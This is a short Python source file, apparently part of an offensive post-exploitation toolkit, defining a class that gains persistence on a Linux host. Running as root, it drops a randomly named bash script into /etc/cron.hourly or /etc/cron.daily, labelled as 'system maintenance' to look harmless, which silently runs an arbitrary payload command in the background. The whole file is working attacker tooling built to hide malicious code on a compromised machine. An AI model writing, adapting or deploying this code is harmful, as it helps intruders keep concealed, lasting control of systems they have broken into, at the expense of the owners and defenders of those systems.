import os
from ..core import CronPersistence
from ..utils.helpers import generate_random_name

class ScheduledScriptPersistence(CronPersistence):
    def hourly(self, payload_command: str):
        return self._create_script("/etc/cron.hourly", payload_command, "hourly")

    def daily(self, payload_command: str):
        return self._create_script("/etc/cron.daily", payload_command, "daily")

    def _create_script(self, directory: str, payload_command: str, freq: str):
        if not self.is_root:
            print("[!] Root required")
            return None

        script_name = generate_random_name()
        path = f"{directory}/{script_name}"
        content = f"""#!/bin/bash
# {freq.capitalize()} system maintenance
{payload_command} >/dev/null 2>&1 &
"""

        try:
            with open(path, 'w') as f:
                f.write(content)
            os.chmod(path, 0o755)
            print(f"[+] {freq.capitalize()} script installed: {path}")
            return {
                'method': f'{freq}_cron_script',
                'location': path,
                'remove_command': f'rm -f {path}'
            }
        except Exception as e:
            print(f"[-] Error: {e}")
            return None